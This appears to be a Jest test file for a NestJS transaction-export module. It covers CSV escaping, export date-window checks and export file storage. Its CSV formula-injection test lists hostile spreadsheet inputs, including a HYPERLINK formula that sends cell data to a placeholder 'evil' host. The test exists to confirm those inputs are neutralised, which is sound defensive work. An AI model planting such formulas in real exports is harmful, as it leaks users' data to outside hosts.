import { csvEscape } from './csv.util';
import { assertExportWindow } from '../dto/export-transactions.dto';
import { ExportStorageService } from './export-storage.service';
import { JwtService } from '@nestjs/jwt';
import { mkdtempSync, writeFileSync, existsSync, utimesSync, rmSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('csvEscape (#1366)', () => {
  it.each(['=HYPERLINK("http://evil/?"&A1,"x")', '@SUM(A1:A9)', '+1+1', '-2+3', '\tcmd', '\rcmd'])(
    'neutralises the formula trigger in %j',
    (value) => {
      const out = csvEscape(value);
      expect(out.replace(/^"/, '').startsWith("'")).toBe(true);
    },
  );

  it('keeps ordinary values and negative numbers intact', () => {
    expect(csvEscape('REF-123')).toBe('REF-123');
    expect(csvEscape(-5.25)).toBe('-5.25');
    expect(csvEscape(null)).toBe('');
  });

  it('still quotes commas, quotes and newlines', () => {
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape('line\nbreak')).toBe('"line\nbreak"');
  });
});

describe('assertExportWindow (#1366)', () => {
  it('accepts up to 366 days and rejects longer or reversed windows', () => {
    expect(() => assertExportWindow('2026-01-01T00:00:00Z', '2026-12-31T00:00:00Z')).not.toThrow();
    expect(() => assertExportWindow('2024-01-01T00:00:00Z', '2026-01-01T00:00:00Z')).toThrow();
    expect(() => assertExportWindow('2026-02-01T00:00:00Z', '2026-01-01T00:00:00Z')).toThrow();
  });
});

describe('ExportStorageService.purgeExpired (#1366)', () => {
  it('deletes only files older than the download TTL', () => {
    const service = new ExportStorageService(new JwtService({ secret: 's' }), { get: () => 'secret' } as any);
    const dir = process.env.EXPORTS_DIR || join(process.cwd(), 'tmp', 'exports');
    const stale = join(dir, `stale-${Date.now()}.csv`);
    const fresh = join(dir, `fresh-${Date.now()}.csv`);
    writeFileSync(stale, 'x');
    writeFileSync(fresh, 'x');
    const old = new Date(Date.now() - 3_600_000);
    utimesSync(stale, old, old);

    expect(service.purgeExpired()).toBeGreaterThanOrEqual(1);
    expect(existsSync(stale)).toBe(false);
    expect(existsSync(fresh)).toBe(true);
    rmSync(fresh, { force: true });
  });

  it('copies across filesystems instead of renaming', () => {
    const service = new ExportStorageService(new JwtService({ secret: 's' }), { get: () => 'secret' } as any);
    const src = join(mkdtempSync(join(tmpdir(), 'exp-')), 'job.csv');
    writeFileSync(src, 'id\n1\n');
    const { downloadUrl } = service.store(src, `copy-${Date.now()}`, 'csv');
    expect(downloadUrl).toContain('/download?token=');
    expect(existsSync(src)).toBe(false);
  });
});
